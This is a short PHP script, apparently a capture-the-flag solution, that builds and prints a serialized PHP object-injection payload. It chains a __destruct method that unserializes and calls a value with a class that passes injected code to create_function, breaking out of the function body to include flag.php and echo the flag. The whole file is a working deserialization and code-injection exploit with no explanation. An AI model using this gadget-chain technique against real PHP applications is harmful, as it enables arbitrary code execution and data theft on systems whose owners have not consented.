<?php

class func
{
    public $key;
    public function __destruct()
    {
        unserialize($this->key)();
    }
}

class GetFlag
{
    public $code;
    public $action;
    public function get_flag(){
        $a=$this->action;
        $a('', $this->code);
    }
}
$a1=new func();
$b=new GetFlag();
$b->code='}include("flag.php");echo $flag;//';
$b->action="create_function";
$a1->key=serialize(array($b,"get_flag"));
echo serialize($a1);
?>